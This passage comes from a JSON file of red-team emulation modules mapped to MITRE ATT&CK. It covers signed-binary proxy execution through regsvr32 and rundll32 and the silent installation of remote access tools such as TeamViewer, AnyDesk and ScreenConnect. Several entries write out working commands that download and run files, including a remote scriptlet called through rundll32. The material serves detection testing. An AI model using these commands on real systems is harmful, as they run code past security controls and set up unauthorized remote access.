      "technique_name": "Signed Binary Proxy Execution: Regsvr32",
      "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Normally, an install is executed with /n to prevent calling DllRegisterServer.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "#{regsvr32path}\\#{regsvr32name} /s /i \"#{dll_name}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "dll_name",
          "description": "Name of DLL to Install",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\T1218.010\\bin\\AllTheThingsx86.dll"
        },
        {
          "name": "regsvr32path",
          "description": "Default location of Regsvr32.exe",
          "type": "string",
          "default_value": "C:\\Windows\\system32"
        },
        {
          "name": "regsvr32name",
          "description": "Default name of Regsvr32.exe",
          "type": "string",
          "default_value": "regsvr32.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})",
          "check_command": "if (Test-Path \"#{dll_name}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{dll_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.010/bin/AllTheThingsx86.dll\" -OutFile \"#{dll_name}\""
        }
      ],
      "rx_module_id": "9d71c492-ea2e-4c08-af16-c6994cdf029f",
      "module_name": "Regsvr32 Silent DLL Install Call DllRegisterServer"
    },
    {
      "index": 1023,
      "technique_id": "T1218.011",
      "technique_name": "Signed Binary Proxy Execution: Rundll32",
      "description": "Test execution of a remote script using rundll32.exe. Upon execution notepad.exe will be opened. \nThis has been used by Win32/Poweliks malware and works as described [here](https://www.stormshield.com/news/poweliks-command-line-confusion/)\n\nNote: The GetObject function is no longer supported in Internet Explorer v9 (2011) and later so this technique would only work where very old versions of IE are installed. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:#{file_url}\").Exec();window.close();\n",
        "elevation_required": false,
        "cleanup_command": "taskkill /IM notepad.exe /f\n"
      },
      "variables": [
        {
          "name": "file_url",
          "description": "location of the payload",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1218.011/src/T1218.011.sct"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "57ba4ce9-ee7a-4f27-9928-3c70c489b59d",
      "module_name": "Rundll32 execute JavaScript Remote Payload With GetObject"
    },
    {
      "index": 1024,
      "technique_id": "T1218.011",
      "technique_name": "Signed Binary Proxy Execution: Rundll32",
      "description": "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.\nTechnique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\nUpon execution calc.exe will be launched\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(CreateObject(\"WScript.Shell\").Run(\"#{command_to_execute}\"),0)\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "command_to_execute",
          "description": "Command for rundll32.exe to execute",
          "type": "string",
          "default_value": "calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "638730e7-7aed-43dc-bf8c-8117f805f5bb",
      "module_name": "Rundll32 execute VBscript command"
    },
    {
      "index": 1025,
      "technique_id": "T1218.011",
      "technique_name": "Signed Binary Proxy Execution: Rundll32",
      "description": "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.\nTechnique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\nUpon execution calc.exe will be launched\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "rundll32 vbscript:\"\\..\\mshtml,#135 \"+String(CreateObject(\"WScript.Shell\").Run(\"#{command_to_execute}\"),0)\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "command_to_execute",
          "description": "Command for rundll32.exe to execute",
          "type": "string",
          "default_value": "calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "32d1cf1b-cbc2-4c09-8d05-07ec5c83a821",
      "module_name": "Rundll32 execute VBscript command using Ordinal number"
    },
    {
      "index": 1026,
      "technique_id": "T1218.011",
      "technique_name": "Signed Binary Proxy Execution: Rundll32",
      "description": "Test execution of a command using rundll32.exe with advpack.dll.\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml\nUpon execution calc.exe will be launched\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "rundll32.exe advpack.dll,LaunchINFSection \"#{inf_to_execute}\",DefaultInstall_SingleUser,1,\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "inf_to_execute",
          "description": "Local location of inf file",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\T1218.011\\src\\T1218.011.inf"
        }
      ],
      "prerequisites": [
        {
          "description": "Inf file must exist on disk at specified location (\"#{inf_to_execute}\")\n",
          "check_command": "if (Test-Path \"#{inf_to_execute}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{inf_to_execute}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.011/src/T1218.011.inf\" -OutFile \"#{inf_to_execute}\"\n"
        }
      ],
      "rx_module_id": "d91cae26-7fc1-457b-a854-34c8aad48c89",
      "module_name": "Rundll32 advpack.dll Execution"
    },
    {
      "index": 1027,
      "technique_id": "T1218.011",
      "technique_name": "Signed Binary Proxy Execution: Rundll32",
      "description": "Test execution of a command using rundll32.exe with ieadvpack.dll.\nUpon execution calc.exe will be launched\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "rundll32.exe ieadvpack.dll,LaunchINFSection \"#{inf_to_execute}\",DefaultInstall_SingleUser,1,\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "inf_to_execute",
          "description": "Local location of inf file",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\T1218.011\\src\\T1218.011.inf"
        }
      ],
      "prerequisites": [
        {
          "description": "Inf file must exist on disk at specified location (\"#{inf_to_execute}\")\n",
          "check_command": "if (Test-Path \"#{inf_to_execute}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{inf_to_execute}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.011/src/T1218.011.inf\" -OutFile \"#{inf_to_execute}\"\n"
        }
      ],
      "rx_module_id": "5e46a58e-cbf6-45ef-a289-ed7754603df9",
      "module_name": "Rundll32 ieadvpack.dll Execution"
    },
    {
      "index": 1028,
      "technique_id": "T1218.011",
      "technique_name": "Signed Binary Proxy Execution: Rundll32",
      "description": "Test execution of a command using rundll32.exe with syssetup.dll. Upon execution, a window saying \"installation failed\" will be opened\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 \"#{inf_to_execute}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "inf_to_execute",
          "description": "Local location of inf file",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf"
        }
      ],
      "prerequisites": [
        {
          "description": "Inf file must exist on disk at specified location (\"#{inf_to_execute}\")\n",
          "check_command": "if (Test-Path \"#{inf_to_execute}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{inf_to_execute}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.011/src/T1218.011_DefaultInstall.inf\" -OutFile \"#{inf_to_execute}\"\n"
        }
      ],
      "rx_module_id": "41fa324a-3946-401e-bbdd-d7991c628125",
      "module_name": "Rundll32 syssetup.dll Execution"
    },
    {
      "index": 1029,
      "technique_id": "T1218.011",
      "technique_name": "Signed Binary Proxy Execution: Rundll32",
      "description": "Test execution of a command using rundll32.exe with setupapi.dll. Upon execution, a windows saying \"installation failed\" will be opened\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 \"#{inf_to_execute}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "inf_to_execute",
          "description": "Local location of inf file",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf"
        }
      ],
      "prerequisites": [
        {
          "description": "Inf file must exist on disk at specified location (\"#{inf_to_execute}\")\n",
          "check_command": "if (Test-Path \"#{inf_to_execute}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{inf_to_execute}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.011/src/T1218.011_DefaultInstall.inf\" -OutFile \"#{inf_to_execute}\"\n"
        }
      ],
      "rx_module_id": "71d771cd-d6b3-4f34-bc76-a63d47a10b19",
      "module_name": "Rundll32 setupapi.dll Execution"
    },
    {
      "index": 1030,
      "technique_id": "T1218.011",
      "technique_name": "Signed Binary Proxy Execution: Rundll32",
      "description": "IcedID uses this TTP as follows:\n  rundll32.exe url.dll,OpenURL %PUBLIC%\\index.hta\nTrickbot uses this TTP as follows:\n  rundll32.exe URL.dll,FileProtocolHandler C:\\\\..\\\\Detail\\\\akteullen.vbs\n\nIn this raglox, the sample hta file opens the calculator and the vbs file shows a message dialog with \"rundll32 spawned wscript\"\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "rundll32.exe url.dll,OpenURL \"PathToRagloxModulesFolder\\T1218.011\\src\\index.hta\"\nrundll32.exe URL.dll,FileProtocolHandler \"PathToRagloxModulesFolder\\T1218.011\\src\\akteullen.vbs\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "22cfde89-befe-4e15-9753-47306b37a6e3",
      "module_name": "Execution of HTA and VBS Files using Rundll32 and URL.dll"
    },
    {
      "index": 1031,
      "technique_id": "T1218.011",
      "technique_name": "Signed Binary Proxy Execution: Rundll32",
      "description": "Executes the LaunchApplication function in pcwutl.dll to proxy execution of an executable.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "rundll32.exe pcwutl.dll,LaunchApplication #{exe_to_launch}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "exe_to_launch",
          "description": "Path of the executable to launch",
          "type": "path",
          "default_value": "%windir%\\System32\\notepad.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "9f5d081a-ee5a-42f9-a04e-b7bdc487e676",
      "module_name": "Launches an executable using Rundll32 and pcwutl.dll"
    },
    {
      "index": 1032,
      "technique_id": "T1218.011",
      "technique_name": "Signed Binary Proxy Execution: Rundll32",
      "description": "Rundll32.exe running non-dll \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "rundll32.exe #{input_file}, StartW\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "input_url",
          "description": "Url to download the DLL",
          "type": "url",
          "default_value": "https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1047/bin/calc.dll"
        },
        {
          "name": "input_file",
          "description": "Non-dll file",
          "type": "string",
          "default_value": "C:\\Users\\$env:username\\Downloads\\calc.png"
        }
      ],
      "prerequisites": [
        {
          "description": "Non-dll file must exist on disk at specified location\n",
          "check_command": "if (Test-Path #{input_file}) {exit 0} else {exit 1}\n",
          "install_command": "Invoke-WebRequest \"#{input_url}\" -OutFile \"#{input_file}\"\n"
        }
      ],
      "rx_module_id": "ae3a8605-b26e-457c-b6b3-2702fd335bac",
      "module_name": "Execution of non-dll using rundll32.exe"
    },
    {
      "index": 1033,
      "technique_id": "T1218.011",
      "technique_name": "Signed Binary Proxy Execution: Rundll32",
      "description": "Rundll32.exe loading dll using ordinal value #2 to DLLRegisterServer. \nUpon successful execution, Calc.exe will spawn.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "rundll32.exe \"#{input_file}\",#2\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "input_url",
          "description": "Url to download the DLL",
          "type": "url",
          "default_value": "https://github.com/redcanaryco/raglox-red-team/blob/master/rx_modules/T1218.010/bin/AllTheThingsx64.dll"
        },
        {
          "name": "input_file",
          "description": "DLL File",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\T1218.010\\bin\\AllTheThingsx64.dll"
        }
      ],
      "prerequisites": [
        {
          "description": "DLL file must exist on disk at specified location\n",
          "check_command": "if (Test-Path \"#{input_file}\") {exit 0} else {exit 1}\n",
          "install_command": "Invoke-WebRequest \"#{input_url}\" -OutFile \"#{input_file}\"\n"
        }
      ],
      "rx_module_id": "9fd5a74b-ba89-482a-8a3e-a5feaa3697b0",
      "module_name": "Rundll32 with Ordinal Value"
    },
    {
      "index": 1034,
      "technique_id": "T1218.011",
      "technique_name": "Signed Binary Proxy Execution: Rundll32",
      "description": "Rundll32.exe loading dll with 'control_rundll' within the command-line, loading a .cpl or another file type related to CVE-2021-40444. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "rundll32.exe shell32.dll,Control_RunDLL \"#{input_file}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "input_url",
          "description": "Url to download the DLL",
          "type": "url",
          "default_value": "https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1047/bin/calc.dll"
        },
        {
          "name": "input_file",
          "description": "DLL File",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\T1047\\bin\\calc.dll"
        }
      ],
      "prerequisites": [
        {
          "description": "DLL file must exist on disk at specified location\n",
          "check_command": "if (Test-Path \"#{input_file}\") {exit 0} else {exit 1}\n",
          "install_command": "Invoke-WebRequest \"#{input_url}\" -OutFile \"#{input_file}\"\n"
        }
      ],
      "rx_module_id": "e4c04b6f-c492-4782-82c7-3bf75eb8077e",
      "module_name": "Rundll32 with Control_RunDLL"
    },
    {
      "index": 1035,
      "technique_id": "T1218.011",
      "technique_name": "Signed Binary Proxy Execution: Rundll32",
      "description": "Rundll32.exe loading an executable renamed as .scr using desk.cpl \nReference: \n  - [LOLBAS - Libraries/Desk](https://lolbas-project.github.io/lolbas/Libraries/Desk/)\nSIGMA rules:\n  - [SCR File Write Event](https://github.com/SigmaHQ/sigma/blob/b53f08b081e0a50099be9b9e8eced82097fdbaf2/rules/windows/file_event/file_event_win_new_src_file.yml)\n  - [Rundll32 InstallScreenSaver Execution](https://github.com/SigmaHQ/sigma/blob/b53f08b081e0a50099be9b9e8eced82097fdbaf2/rules/windows/process_creation/proc_creation_win_lolbin_rundll32_installscreensaver.yml)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "copy #{exe_to_launch} not_an_scr.scr\nrundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr\n",
        "elevation_required": false,
        "cleanup_command": "del not_an_scr.scr"
      },
      "variables": [
        {
          "name": "exe_to_launch",
          "description": "Path of the executable to launch",
          "type": "path",
          "default_value": "%windir%\\System32\\calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "83a95136-a496-423c-81d3-1c6750133917",
      "module_name": "Rundll32 with desk.cpl"
    },
    {
      "index": 1036,
      "technique_id": "T1218.011",
      "technique_name": "Signed Binary Proxy Execution: Rundll32",
      "description": "This test, based on common Gamarue tradecraft, consists of a DLL file with a .init extension being run by rundll32.exe. When this DLL file's 'krnl' function is called, it launches a Windows pop-up.\nDLL created with the RAGLOXTestHarnesses Portable Executable Builder script.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "rundll32.exe #{dll_file},krnl\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "dll_file",
          "description": "The DLL file to be called",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\T1218.011\\bin\\_WT.init"
        },
        {
          "name": "dll_url",
          "description": "The URL to the DLL file that must be downloaded",
          "type": "url",
          "default_value": "https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1218.011/bin/_WT.init"
        }
      ],
      "prerequisites": [
        {
          "description": "The DLL file to be called must exist at the specified location (#{dll_file})",
          "check_command": "if (Test-Path \"#{dll_file}\") {exit 0} else {exit 1}",
          "install_command": "New-Item -Type Directory (split-path \"#{dll_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"#{dll_url}\" -OutFile \"#{dll_file}\"\n"
        }
      ],
      "rx_module_id": "2d5029f0-ae20-446f-8811-e7511b58e8b6",
      "module_name": "Running DLL with .init extension and function"
    },
    {
      "index": 1037,
      "technique_id": "T1218.011",
      "technique_name": "Signed Binary Proxy Execution: Rundll32",
      "description": "Test execution of a command using rundll32.exe and the FileProtocolHandler technique.\nUpon execution, calc.exe will be launched.\nThis technique is documented by Levan Abesadze - https://medium.com/@Wolverineisstillalive/system-binary-proxy-execution-rundll32-bypass-method-790871e1f2b7\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "rundll32.exe url.dll,FileProtocolHandler #{command_to_execute}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "command_to_execute",
          "description": "Command for rundll32.exe to execute",
          "type": "string",
          "default_value": "calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "f3ad3c5b-1db1-45c1-81bf-d3370ebab6c8",
      "module_name": "Rundll32 execute command via FileProtocolHandler"
    },
    {
      "index": 1038,
      "technique_id": "T1218.011",
      "technique_name": "Signed Binary Proxy Execution: Rundll32",
      "description": "Launch an executable payload by calling RouteTheCall. Test execution of a command using rundll32.exe to execute a payload{calc.exe} by calling RouteTheCall. Upon execution, calc.exe will be launched.\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Zipfldr.yml\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "rundll32.exe zipfldr.dll,RouteTheCall \"#{exe_to_launch}\"",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "exe_to_launch",
          "description": "Path of the executable to launch",
          "type": "path",
          "default_value": "'%windir%\\System32\\calc.exe'"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "8a7f56ee-10e7-444c-a139-0109438288eb",
      "module_name": "Rundll32 execute payload by calling RouteTheCall"
    },
    {
      "index": 1039,
      "technique_id": "T1219",
      "technique_name": "Remote Access Software",
      "description": "An adversary may attempt to trick the user into downloading teamviewer and using this to maintain access to the machine. Download of TeamViewer installer will be at the destination location when sucessfully executed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\TeamViewer_Setup.exe\"\nStart-Process -Wait $file1 /S; \nStart-Process 'C:\\Program Files (x86)\\TeamViewer\\TeamViewer.exe'\n",
        "elevation_required": true,
        "cleanup_command": "$file = 'C:\\Program Files (x86)\\TeamViewer\\uninstall.exe'\nif(Test-Path $file){ Start-Process $file \"/S\" -ErrorAction Ignore | Out-Null }\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\TeamViewer_Setup.exe\"\nRemove-Item $file1 -ErrorAction Ignore | Out-Null"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "8ca3b96d-8983-4a7f-b125-fc98cc0a2aa0",
      "module_name": "TeamViewer Files Detected Test on Windows"
    },
    {
      "index": 1040,
      "technique_id": "T1219",
      "technique_name": "Remote Access Software",
      "description": "An adversary may attempt to trick the user into downloading AnyDesk and use to establish C2. Download of AnyDesk installer will be at the destination location and ran when sucessfully executed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\AnyDesk.exe\"\nStart-Process $file1 /S;\n",
        "elevation_required": true,
        "cleanup_command": "$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\AnyDesk.exe\"\nRemove-Item $file1 -ErrorAction Ignore"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "6b8b7391-5c0a-4f8c-baee-78d8ce0ce330",
      "module_name": "AnyDesk Files Detected Test on Windows"
    },
    {
      "index": 1041,
      "technique_id": "T1219",
      "technique_name": "Remote Access Software",
      "description": "An adversary may attempt to trick the user into downloading LogMeIn and use to establish C2. Download of LogMeIn installer will be at the destination location and ran when sucessfully executed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"\nStart-Process -Wait $file1 /quiet;\nStart-Process 'C:\\Program Files (x86)\\LogMeIn Ignition\\LMIIgnition.exe' \"/S\"\n",
        "elevation_required": true,
        "cleanup_command": "get-package *'LogMeIn Client'* -ErrorAction Ignore | uninstall-package \n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"\nRemove-Item $file1 -ErrorAction Ignore"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "d03683ec-aae0-42f9-9b4c-534780e0f8e1",
      "module_name": "LogMeIn Files Detected Test on Windows"
    },
    {
      "index": 1042,
      "technique_id": "T1219",
      "technique_name": "Remote Access Software",
      "description": "An adversary may attempt to trick the user into downloading GoToAssist and use to establish C2. Download of GoToAssist installer will be at the destination location and ran when sucessfully executed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Downloads\\GoToAssist.exe \"https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1\"\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Downloads\\GoToAssist.exe\"\nStart-Process $file1 /S;\n",
        "elevation_required": true,
        "cleanup_command": "try{\"$PathToRagloxModulesFolder/T1219/bin/GoToCleanup.ps1\"} catch{}"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "1b72b3bd-72f8-4b63-a30b-84e91b9c3578",
      "module_name": "GoToAssist Files Detected Test on Windows"
    },
    {
      "index": 1043,
      "technique_id": "T1219",
      "technique_name": "Remote Access Software",
      "description": "An adversary may attempt to trick the user into downloading ScreenConnect for use as a C2 channel. Download of ScreenConnect installer will be in the Downloads directory.\nMsiexec will be used to quietly insall ScreenConnect.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$installer = \"C:\\Users\\$env:username\\Downloads\\ScreenConnect.msi\"\nInvoke-WebRequest -OutFile $installer \"https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_25.1.10.9197_Release.msi\"\nmsiexec /i $installer /qn\n",
        "elevation_required": true,
        "cleanup_command": "$installer = \"C:\\Users\\$env:username\\Downloads\\ScreenConnect.msi\"\nmsiexec /x $installer /qn\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "4a18cc4e-416f-4966-9a9d-75731c4684c0",
      "module_name": "ScreenConnect Application Download and Install on Windows"
    },
    {
      "index": 1044,
      "technique_id": "T1219",
      "technique_name": "Remote Access Software",
      "description": "An adversary may attempt to trick the user into downloading Ammyy Admin Remote Desktop Software for use as a C2 channel. \nUpon successful execution, Ammyy Admin will be executed. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-Process \"#{Ammyy_Admin_Path}\"\n",
        "elevation_required": true,
        "cleanup_command": "Stop-Process -Name \"Ammyy\" -force -erroraction silentlycontinue\n"
      },
      "variables": [
        {
          "name": "Ammyy_Admin_Path",
          "description": "Path of Ammyy Admin executable",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\ammyy.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Ammyy Admin must exist on disk at the specified location (#{Ammyy_Admin_Path})\n",
          "check_command": "if (Test-Path \"#{Ammyy_Admin_Path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://web.archive.org/web/20140625232737/http://www.ammyy.com/AA_v3.exe\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\ammyy.exe\" -UseBasicParsing\n"
        }
      ],
      "rx_module_id": "0ae9e327-3251-465a-a53b-485d4e3f58fa",
      "module_name": "Ammyy Admin Software Execution"
    },
    {
      "index": 1045,
      "technique_id": "T1219",
      "technique_name": "Remote Access Software",
      "description": "An adversary may attempt to trick the user into downloading RemotePC Software for use as a C2 channel. \nUpon successful execution, RemotePC will be executed. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-Process \"#{RemotePC_Path}\"\n",
        "elevation_required": true,
        "cleanup_command": "Unregister-ScheduledTask -TaskName \"RemotePC\" -Confirm:$False -ErrorAction SilentlyContinue\nUnregister-ScheduledTask -TaskName \"RPCServiceHealthCheck\" -Confirm:$False -ErrorAction SilentlyContinue\nUnregister-ScheduledTask -TaskName \"ServiceMonitor\" -Confirm:$False -ErrorAction SilentlyContinue\nUnregister-ScheduledTask -TaskName \"StartRPCService\" -Confirm:$False -ErrorAction SilentlyContinue      \nStop-Process -Name \"RemotePCPerformance\" -force -erroraction silentlycontinue\nStop-Process -Name \"RPCPerformanceService\" -force -erroraction silentlycontinue\nStop-Process -Name \"RemotePCUIU\" -force -erroraction silentlycontinue\nStop-Process -Name \"RPCDownloader\" -force -erroraction silentlycontinue\nStop-Process -Name \"RemotePCService\" -force -erroraction silentlycontinue\nStop-Process -Name \"RPCService\" -force -erroraction silentlycontinue\n"
      },
      "variables": [
        {
          "name": "RemotePC_Path",
          "description": "Path of RemotePC executable",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\RemotePC.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "RemotePC must exist on disk at the specified location (#{RemotePC_Path})\n",
          "check_command": "if (Test-Path \"#{RemotePC_Path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://static.remotepc.com/downloads/rpc/140422/RemotePC.exe\" -OutFile \"#{RemotePC_Path}\" -UseBasicParsing\n"
        }
      ],
      "rx_module_id": "fbff3f1f-b0bf-448e-840f-7e1687affdce",
      "module_name": "RemotePC Software Execution"
    },
    {
      "index": 1046,
      "technique_id": "T1219",
      "technique_name": "Remote Access Software",
      "description": "A recent trend by threat actors, once a foothold is established, maintain long term persistence using third party remote services such as NetSupport to provide the operator with access to the network using legitimate services. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-Process \"#{NetSupport_Path}\" -ArgumentList \"/S /v/qn\"\n",
        "elevation_required": true,
        "cleanup_command": "Stop-Process -Name \"client32\" -force -erroraction silentlycontinue\n"
      },
      "variables": [
        {
          "name": "NetSupport_Path",
          "description": "Path to the NetSupport executable.",
          "type": "path",
